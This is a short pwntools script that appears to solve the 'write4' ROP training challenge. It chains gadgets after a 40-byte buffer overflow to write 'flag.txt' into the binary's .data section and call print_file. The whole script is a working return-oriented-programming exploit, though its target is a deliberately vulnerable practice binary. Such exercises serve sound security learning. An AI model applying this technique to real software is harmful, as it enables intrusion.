from pwn import *
elf = context.binary = ELF("./write4")
p = process()
offset = 40
pop_r14_r15 = p64(0x0000000000400690)
pop_rdi = p64(0x0000000000400693)
mov_r14_r15 = p64(0x0000000000400628)
data_string = p64(0x0000000000601028)
string = b"flag.txt"
print_file = p64(0x0000000000400510)
aligment = p64(0x00000000004004e6)

payload = b"A" * offset + pop_r14_r15 + data_string + string + mov_r14_r15 + pop_rdi + data_string + aligment + print_file + p64(0x0)

write("payload",payload)
p.sendline(payload)
print(p.recvall())